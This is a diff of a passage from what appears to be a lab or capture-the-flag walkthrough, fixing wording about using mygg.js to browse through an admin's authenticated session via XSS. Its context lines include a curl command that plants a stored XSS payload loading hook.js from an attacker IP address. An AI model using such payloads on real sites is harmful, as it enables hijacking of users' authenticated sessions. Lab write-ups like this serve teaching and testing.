@@ -294,7 +294,7 @@ Cache-Control: no-cache
 
 ### Proxy via XSS
 
-However, there is another trick we can use. We can use a tool called mygg.js to use XSS to browse through the admin's browser to take a look at the site via their authenticated session. Follow the basic installation at https://github.com/dsolstad/mygg.js and edit the configuration in the top section of the file. Change the domain variable to your attacking IP address before starting it the tool `$ node mygg.js`. After this we can change the XSS payload and use mygg's hook instead.
+However, there is another trick we can use. We can use a tool called mygg.js to use XSS to browse through the admin's browser to take a look at the site via their authenticated session. Follow the basic installation at https://github.com/dsolstad/mygg.js and edit the configuration in the top section of the file. Change the domain variable to your attacking IP address before starting it with `$ node mygg.js`. After this we can change the XSS payload and use mygg's hook instead.
 
 ```
 root@kali:~# curl -i -d "username=test4&password=test&dna_string=<svg/onload=\"var x=document.createElement('script');x.src='http://192.168.0.34/hook.js';document.head.appendChild(x);\">" http://alphonse/dnanalyzer/api/register.php
